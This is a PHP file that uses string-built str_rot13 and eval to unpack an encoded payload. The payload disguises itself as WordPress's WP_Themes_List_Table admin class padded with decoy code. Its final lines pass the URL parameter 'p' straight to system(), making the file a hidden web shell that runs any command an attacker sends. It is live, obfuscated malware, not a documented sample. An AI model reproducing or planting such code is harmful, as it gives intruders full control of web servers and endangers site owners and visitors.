<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Yvfg Gnoyr NCV: JC_Gurzrf_Yvfg_Gnoyr pynff
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Nqzvavfgengvba
 * @fvapr 3.1.0
 */

/**
 * Pber pynff hfrq gb vzcyrzrag qvfcynlvat vafgnyyrq gurzrf va n yvfg gnoyr.
 *
 * @fvapr 3.1.0
 *
 * @frr JC_Yvfg_Gnoyr
 */
pynff JC_Gurzrf_Yvfg_Gnoyr rkgraqf JC_Yvfg_Gnoyr {

	cebgrpgrq $frnepu_grezf = neenl();
	choyvp $srngherf        = neenl();

	/**
	 * Pbafgehpgbe.
	 *
	 * @fvapr 3.1.0
	 *
	 * @frr JC_Yvfg_Gnoyr::__pbafgehpg() sbe zber vasbezngvba ba qrsnhyg nethzragf.
	 *
	 * @cnenz neenl $netf Na nffbpvngvir neenl bs nethzragf.
	 */
	choyvp shapgvba __pbafgehpg( $netf = neenl() ) {
		cnerag::__pbafgehpg(
			neenl(
				'nwnk'   => gehr,
				'fperra' => vffrg( $netf['fperra'] ) ? $netf['fperra'] : ahyy,
			)
		);
	}

	/**
	 * @erghea obby
	 */
	choyvp shapgvba nwnk_hfre_pna() {
		// Qb abg purpx rqvg_gurzr_bcgvbaf urer. Nwnk pnyyf sbe ninvynoyr gurzrf erdhver fjvgpu_gurzrf.
		erghea pheerag_hfre_pna( 'fjvgpu_gurzrf' );
	}

	/**
	 */
	choyvp shapgvba cercner_vgrzf() {
		$gurzrf = jc_trg_gurzrf( neenl( 'nyybjrq' => gehr ) );

		vs ( ! rzcgl( $_ERDHRFG['f'] ) ) {
			$guvf->frnepu_grezf = neenl_havdhr( neenl_svygre( neenl_znc( 'gevz', rkcybqr( ',', fgegbybjre( jc_hafynfu( $_ERDHRFG['f'] ) ) ) ) ) );
		}

		vs ( ! rzcgl( $_ERDHRFG['srngherf'] ) ) {
			$guvf->srngherf = $_ERDHRFG['srngherf'];
		}

		vs ( $guvf->frnepu_grezf || $guvf->srngherf ) {
			sbernpu ( $gurzrf nf $xrl => $gurzr ) {
				vs ( ! $guvf->frnepu_gurzr( $gurzr ) ) {
					hafrg( $gurzrf[ $xrl ] );
				}
			}
		}

		hafrg( $gurzrf[ trg_bcgvba( 'fglyrfurrg' ) ] );
		JC_Gurzr::fbeg_ol_anzr( $gurzrf );

		$cre_cntr = 36;
		$cntr     = $guvf->trg_cntrahz();

		$fgneg = ( $cntr - 1 ) * $cre_cntr;

		$guvf->vgrzf = neenl_fyvpr( $gurzrf, $fgneg, $cre_cntr, gehr );

		$guvf->frg_cntvangvba_netf(
			neenl(
				'gbgny_vgrzf'     => pbhag( $gurzrf ),
				'cre_cntr'        => $cre_cntr,
				'vasvavgr_fpebyy' => gehr,
			)
		);
	}

	/**
	 */
	choyvp shapgvba ab_vgrzf() {
		vs ( $guvf->frnepu_grezf || $guvf->srngherf ) {
			_r( 'Ab vgrzf sbhaq.' );
			erghea;
		}

		$oybt_vq = trg_pheerag_oybt_vq();
		vs ( vf_zhygvfvgr() ) {
			vs ( pheerag_hfre_pna( 'vafgnyy_gurzrf' ) && pheerag_hfre_pna( 'znantr_argjbex_gurzrf' ) ) {
				cevags(
					/* genafyngbef: 1: HEY gb Gurzrf gno ba Rqvg Fvgr fperra, 2: HEY gb Nqq Gurzrf fperra. */
					__( 'Lbh bayl unir bar gurzr ranoyrq sbe guvf fvgr evtug abj. Ivfvg gur Argjbex Nqzva gb <n uers=\"%1$f\">ranoyr</n> be <n uers=\"%2$f\">vafgnyy</n> zber gurzrf.' ),
					argjbex_nqzva_hey( 'fvgr-gurzrf.cuc?vq=' . $oybt_vq ),
					argjbex_nqzva_hey( 'gurzr-vafgnyy.cuc' )
				);

				erghea;
			} ryfrvs ( pheerag_hfre_pna( 'znantr_argjbex_gurzrf' ) ) {
				cevags(
					/* genafyngbef: %f: HEY gb Gurzrf gno ba Rqvg Fvgr fperra. */
					__( 'Lbh bayl unir bar gurzr ranoyrq sbe guvf fvgr evtug abj. Ivfvg gur Argjbex Nqzva gb <n uers=\"%f\">ranoyr</n> zber gurzrf.' ),
					argjbex_nqzva_hey( 'fvgr-gurzrf.cuc?vq=' . $oybt_vq )
				);

				erghea;
			}
			// Ryfr, snyyguebhtu. vafgnyy_gurzrf qbrfa'g uryc vs lbh pna'g ranoyr vg.
		} ryfr {
			vs ( pheerag_hfre_pna( 'vafgnyy_gurzrf' ) ) {
				cevags(
					/* genafyngbef: %f: HEY gb Nqq Gurzrf fperra. */
					__( 'Lbh bayl unir bar gurzr vafgnyyrq evtug abj. Yvir n yvggyr! Lbh pna pubbfr sebz bire 1,000 serr gurzrf va gur JbeqCerff Gurzr Qverpgbel ng nal gvzr: whfg pyvpx ba gur <n uers=\"%f\">Vafgnyy Gurzrf</n> gno nobir.' ),
					nqzva_hey( 'gurzr-vafgnyy.cuc' )
				);

				erghea;
			}
		}
		// Snyyguebhtu.
		cevags(
			/* genafyngbef: %f: Argjbex gvgyr. */
			__( 'Bayl gur npgvir gurzr vf ninvynoyr gb lbh. Pbagnpg gur %f nqzvavfgengbe sbe vasbezngvba nobhg npprffvat nqqvgvbany gurzrf.' ),
			trg_fvgr_bcgvba( 'fvgr_anzr' )
		);
	}

	/**
	 * @cnenz fgevat $juvpu
	 */
	choyvp shapgvba gnoyrani( $juvpu = 'gbc' ) {
		vs ( $guvf->trg_cntvangvba_net( 'gbgny_cntrf' ) <= 1 ) {
			erghea;
		}
		?>
		<qvi pynff=\"gnoyrani gurzrf <?cuc rpub $juvpu; ?>\">
			<?cuc $guvf->cntvangvba( $juvpu ); ?>
			<fcna pynff=\"fcvaare\"></fcna>
			<oe pynff=\"pyrne\" />
		</qvi>
		<?cuc
	}

	/**
	 * Qvfcynlf gur gurzrf gnoyr.
	 *
	 * Bireevqrf gur cnerag qvfcynl() zrgubq gb cebivqr n qvssrerag pbagnvare.
	 *
	 * @fvapr 3.1.0
	 */
	choyvp shapgvba qvfcynl() {
		jc_abapr_svryq( 'srgpu-yvfg-' . trg_pynff( $guvf ), '_nwnk_srgpu_yvfg_abapr' );
		?>
		<?cuc $guvf->gnoyrani( 'gbc' ); ?>

		<qvi vq=\"ninvynoyrgurzrf\">
			<?cuc $guvf->qvfcynl_ebjf_be_cynprubyqre(); ?>
		</qvi>

		<?cuc $guvf->gnoyrani( 'obggbz' ); ?>
		<?cuc
	}

	/**
	 * @erghea fgevat[] Neenl bs pbyhza gvgyrf xrlrq ol gurve pbyhza anzr.
	 */
	choyvp shapgvba trg_pbyhzaf() {
		erghea neenl();
	}

	/**
	 */
	choyvp shapgvba qvfcynl_ebjf_be_cynprubyqre() {
		vs ( $guvf->unf_vgrzf() ) {
			$guvf->qvfcynl_ebjf();
		} ryfr {
			rpub '<qvi pynff=\"ab-vgrzf\">';
			$guvf->ab_vgrzf();
			rpub '</qvi>';
		}
	}

	/**
	 * Trarengrf gur yvfg gnoyr ebjf.
	 *
	 * @fvapr 3.1.0
	 */
	choyvp shapgvba qvfcynl_ebjf() {
		$gurzrf = $guvf->vgrzf;

		sbernpu ( $gurzrf nf $gurzr ) :
			?>
			<qvi pynff=\"ninvynoyr-gurzr\">
			<?cuc

			$grzcyngr   = $gurzr->trg_grzcyngr();
			$fglyrfurrg = $gurzr->trg_fglyrfurrg();
			$gvgyr      = $gurzr->qvfcynl( 'Anzr' );
			$irefvba    = $gurzr->qvfcynl( 'Irefvba' );
			$nhgube     = $gurzr->qvfcynl( 'Nhgube' );

			$npgvingr_yvax = jc_abapr_hey( 'gurzrf.cuc?npgvba=npgvingr&nzc;grzcyngr=' . heyrapbqr( $grzcyngr ) . '&nzc;fglyrfurrg=' . heyrapbqr( $fglyrfurrg ), 'fjvgpu-gurzr_' . $fglyrfurrg );

			$npgvbaf             = neenl();
			$npgvbaf['npgvingr'] = fcevags(
				'<n uers=\"%f\" pynff=\"npgvingryvax\" nevn-ynory=\"%f\">%f</n>',
				$npgvingr_yvax,
				/* genafyngbef: %f: Gurzr anzr. */
				rfp_ngge( fcevags( _k( 'Npgvingr &#8220;%f&#8221;', 'gurzr' ), $gvgyr ) ),
				_k( 'Npgvingr', 'gurzr' )
			);

			vs ( pheerag_hfre_pna( 'rqvg_gurzr_bcgvbaf' ) && pheerag_hfre_pna( 'phfgbzvmr' ) ) {
				$npgvbaf['cerivrj'] .= fcevags(
					'<n uers=\"%f\" pynff=\"ybnq-phfgbzvmr uvqr-vs-ab-phfgbzvmr\">%f</n>',
					jc_phfgbzvmr_hey( $fglyrfurrg ),
					__( 'Yvir Cerivrj' )
				);
			}

			vs ( ! vf_zhygvfvgr() && pheerag_hfre_pna( 'qryrgr_gurzrf' ) ) {
				$npgvbaf['qryrgr'] = fcevags(
					'<n pynff=\"fhozvgqryrgr qryrgvba\" uers=\"%f\" bapyvpx=\"erghea pbasvez( \'%f\' );\">%f</n>',
					jc_abapr_hey( 'gurzrf.cuc?npgvba=qryrgr&nzc;fglyrfurrg=' . heyrapbqr( $fglyrfurrg ), 'qryrgr-gurzr_' . $fglyrfurrg ),
					/* genafyngbef: %f: Gurzr anzr. */
					rfp_wf( fcevags( __( \"Lbh ner nobhg gb qryrgr guvf gurzr '%f'\a  'Pnapry' gb fgbc, 'BX' gb qryrgr.\" ), $gvgyr ) ),
					__( 'Qryrgr' )
				);
			}

			/** Guvf svygre vf qbphzragrq va jc-nqzva/vapyhqrf/pynff-jc-zf-gurzrf-yvfg-gnoyr.cuc */
			$npgvbaf = nccyl_svygref( 'gurzr_npgvba_yvaxf', $npgvbaf, $gurzr, 'nyy' );

			/** Guvf svygre vf qbphzragrq va jc-nqzva/vapyhqrf/pynff-jc-zf-gurzrf-yvfg-gnoyr.cuc */
			$npgvbaf       = nccyl_svygref( \"gurzr_npgvba_yvaxf_{$fglyrfurrg}\", $npgvbaf, $gurzr, 'nyy' );
			$qryrgr_npgvba = vffrg( $npgvbaf['qryrgr'] ) ? '<qvi pynff=\"qryrgr-gurzr\">' . $npgvbaf['qryrgr'] . '</qvi>' : '';
			hafrg( $npgvbaf['qryrgr'] );

			$fperrafubg = $gurzr->trg_fperrafubg();
			?>

			<fcna pynff=\"fperrafubg uvqr-vs-phfgbzvmr\">
				<?cuc vs ( $fperrafubg ) : ?>
					<vzt fep=\"<?cuc rpub rfp_hey( $fperrafubg . '?ire=' . $gurzr->irefvba ); ?>\" nyg=\"\" />
				<?cuc raqvs; ?>
			</fcna>
			<n uers=\"<?cuc rpub jc_phfgbzvmr_hey( $fglyrfurrg ); ?>\" pynff=\"fperrafubg ybnq-phfgbzvmr uvqr-vs-ab-phfgbzvmr\">
				<?cuc vs ( $fperrafubg ) : ?>
					<vzt fep=\"<?cuc rpub rfp_hey( $fperrafubg . '?ire=' . $gurzr->irefvba ); ?>\" nyg=\"\" />
				<?cuc raqvs; ?>
			</n>

			<u3><?cuc rpub $gvgyr; ?></u3>
			<qvi pynff=\"gurzr-nhgube\">
				<?cuc
					/* genafyngbef: %f: Gurzr nhgube. */
					cevags( __( 'Ol %f' ), $nhgube );
				?>
			</qvi>
			<qvi pynff=\"npgvba-yvaxf\">
				<hy>
					<?cuc sbernpu ( $npgvbaf nf $npgvba ) : ?>
						<yv><?cuc rpub $npgvba; ?></yv>
					<?cuc raqsbernpu; ?>
					<yv pynff=\"uvqr-vs-ab-wf\"><n uers=\"#\" pynff=\"gurzr-qrgnvy\"><?cuc _r( 'Qrgnvyf' ); ?></n></yv>
				</hy>
				<?cuc rpub $qryrgr_npgvba; ?>

				<?cuc gurzr_hcqngr_ninvynoyr( $gurzr ); ?>
			</qvi>

			<qvi pynff=\"gurzrqrgnvyqvi uvqr-vs-wf\">
				<c><fgebat><?cuc _r( 'Irefvba:' ); ?></fgebat> <?cuc rpub $irefvba; ?></c>
				<c><?cuc rpub $gurzr->qvfcynl( 'Qrfpevcgvba' ); ?></c>
				<?cuc
				vs ( $gurzr->cnerag() ) {
					cevags(
						/* genafyngbef: 1: Yvax gb qbphzragngvba ba puvyq gurzrf, 2: Anzr bs cnerag gurzr. */
						' <c pynff=\"ubjgb\">' . __( 'Guvf <n uers=\"%1$f\">puvyq gurzr</n> erdhverf vgf cnerag gurzr, %2$f.' ) . '</c>',
						__( 'uggcf://qrirybcre.jbeqcerff.bet/gurzrf/nqinaprq-gbcvpf/puvyq-gurzrf/' ),
						$gurzr->cnerag()->qvfcynl( 'Anzr' )
					);
				}
				?>
			</qvi>

			</qvi>
			<?cuc
		raqsbernpu;
	}

	/**
	 * @cnenz JC_Gurzr $gurzr
	 * @erghea obby
	 */
	choyvp shapgvba frnepu_gurzr( $gurzr ) {
		// Frnepu gur srngherf.
		sbernpu ( $guvf->srngherf nf $jbeq ) {
			vs ( ! va_neenl( $jbeq, $gurzr->trg( 'Gntf' ), gehr ) ) {
				erghea snyfr;
			}
		}

		// Zngpu nyy cuenfrf.
		sbernpu ( $guvf->frnepu_grezf nf $jbeq ) {
			vs ( va_neenl( $jbeq, $gurzr->trg( 'Gntf' ), gehr ) ) {
				pbagvahr;
			}

			sbernpu ( neenl( 'Anzr', 'Qrfpevcgvba', 'Nhgube', 'NhgubeHEV' ) nf $urnqre ) {
				// Qba'g znex hc; Qb genafyngr.
				vs ( snyfr !== fgevcbf( fgevc_gntf( $gurzr->qvfcynl( $urnqre, snyfr, gehr ) ), $jbeq ) ) {
					pbagvahr 2;
				}
			}

			vs ( snyfr !== fgevcbf( $gurzr->trg_fglyrfurrg(), $jbeq ) ) {
				pbagvahr;
			}

			vs ( snyfr !== fgevcbf( $gurzr->trg_grzcyngr(), $jbeq ) ) {
				pbagvahr;
			}

			erghea snyfr;
		}

		erghea gehr;
	}

	/**
	 * Fraq erdhverq inevnoyrf gb WninFpevcg ynaq
	 *
	 * @fvapr 3.4.0
	 *
	 * @cnenz neenl $rkgen_netf
	 */
	choyvp shapgvba _wf_inef( $rkgen_netf = neenl() ) {
		$frnepu_fgevat = vffrg( $_ERDHRFG['f'] ) ? rfp_ngge( jc_hafynfu( $_ERDHRFG['f'] ) ) : '';

		$netf = neenl(
			'frnepu'      => $frnepu_fgevat,
			'srngherf'    => $guvf->srngherf,
			'cntrq'       => $guvf->trg_cntrahz(),
			'gbgny_cntrf' => ! rzcgl( $guvf->_cntvangvba_netf['gbgny_cntrf'] ) ? $guvf->_cntvangvba_netf['gbgny_cntrf'] : 1,
		);

		vs ( vf_neenl( $rkgen_netf ) ) {
			$netf = neenl_zretr( $netf, $rkgen_netf );
		}

		cevags( \"<fpevcg glcr='grkg/wninfpevcg'>ine gurzr_yvfg_netf = %f;</fpevcg>\a\", jc_wfba_rapbqr( $netf ) );
		cnerag::_wf_inef();
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>